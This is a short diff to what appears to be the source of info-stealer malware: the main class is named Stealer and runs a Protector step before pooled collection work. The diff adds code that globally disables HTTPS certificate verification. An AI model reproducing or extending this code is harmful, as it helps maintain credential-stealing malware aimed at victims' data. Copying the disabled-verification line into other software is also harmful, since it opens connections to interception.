@@ -1,3 +1,4 @@
+import ssl
 from sys import argv
 from time import sleep
 from typing import List, Any
@@ -212,6 +213,8 @@ class Stealer(Thread):
                 Thread(target=Message().run).start()
 
             Protector(self.__protectors).run()
+
+            ssl._create_default_https_context = ssl._create_unverified_context
 
             with Pool(processes=self.__config.PoolSize) as pool:
                 results = pool.starmap(functions.run_process, [
